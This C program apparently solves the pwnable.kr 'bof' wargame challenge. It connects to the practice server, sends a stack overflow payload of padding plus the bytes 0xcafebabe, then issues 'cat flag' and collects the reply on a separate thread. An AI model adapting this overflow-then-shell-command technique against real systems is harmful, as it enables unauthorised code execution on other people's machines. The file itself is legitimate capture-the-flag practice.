#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include "required/intrinsic.h"
#include "required/nix.h"
#include "required/memory.h"
#include "required/platform.h"
#include "required/assert.h"
#include "marray.h"
#include "string.h"
#include "queue.h"
#include "nix_socket.h"

bool isDone = false;
struct queue  message = {};
char *messages = NULL;

s32 *RepeatChar(char a, int times)
{
	s32 *result = NULL;
	s32 temp[4] = {};
	temp[0] = a;

	for (int i=0;i<times;i++)
	{
		if (result)
		{
			s32 *tempResult = result;
			result = S32Cat(tempResult,1,temp);

			if (tempResult)
			{
				Free(tempResult);
				tempResult= NULL;
			}
		} else {
			result = S32(temp);	
		}
	}

	return result;
}

void *HandleMessage(void *arg)
{
	s32 *sentence = NULL;
	while(isDone == false)
	{
		if (message.head != NULL)
		{
			struct queue_info *poppedMessageStruct = QueuePop(&message);
				
			if (poppedMessageStruct)
			{
				char* poppedMessage =  (char*) poppedMessageStruct->address;

				printf("%s\n", poppedMessage);

				if (poppedMessage)
				{
					Free(poppedMessage);
					poppedMessage = NULL;
				}
				isDone = true;
			}
		}
	}
	
	pthread_exit(NULL);
}

int main()
{
	char buffer[513] = {};
	int port = 9000;
	int count = 0;
	int socket  =0;
	pthread_t handleMessageThread = {};
		
	pthread_create(&handleMessageThread,NULL,HandleMessage,NULL);

	printf("Connecting to pwnable.kr\n");
	socket = CreateSocket("pwnable.kr", port);

	if (socket)
	{
		s32 *payload = NULL;
		s32 *aBuffer = NULL;
		s32 *eipAddress = NULL;
		s32 theBeef[5] = { 0xbe,0xba,0xfe,0xca};  // = "\xbe\xba\xfe\xca";
		s32 *command = S32("cat flag\n");

		printf("Connected to pwnable.kr\n");

		aBuffer = RepeatChar('a',44);
		eipAddress = RepeatChar('b',8);
		
		payload = S32Cat(aBuffer,3,eipAddress,theBeef,"\n");

		printf("Sending payload..\n");

		if (send(socket,payload,Strlen(payload),0) == -1)
		{
			printf("Error sending payload\n");
		}
		sleep(5);
		printf("Capturing the flag...\n");
		send(socket,command,Strlen(command),0);
		count = 69;
		
		while (count != 0 && isDone == false)
		{
			memset(buffer,0,512);
			count =  read(socket,buffer,512);

			if (count > 0)
			{
				if (messages == NULL)
				{
					messages = S32(buffer);
				}else {
					char *tempMessages = NULL;
					tempMessages = messages;

					messages = S32Cat(tempMessages,1,buffer);

					if (tempMessages)
					{
						Free(tempMessages);
						tempMessages = NULL;
					}
				}

			}  else
			if (count == -1)
			{
				if (messages)
				{
					s32 *newMessage = S32(messages);
					QueuePush(&message,(i32*) newMessage);

					Free(messages);
					messages=NULL;
				}
			}
		
		
		}
			
		isDone = true;
		if (payload)
		{
			Free(payload);
			payload= NULL;
		}

		if (aBuffer)
		{
			Free(aBuffer);
			aBuffer = NULL;
		}

		if (eipAddress)
		{
			Free(eipAddress);
			eipAddress = NULL;
		}

		if (command)
		{
			Free(command);
			command = NULL;
		}

	} else {
		printf("error\n");
	}

	QueueRemoveAll(&message);

	MemoryResults();
}

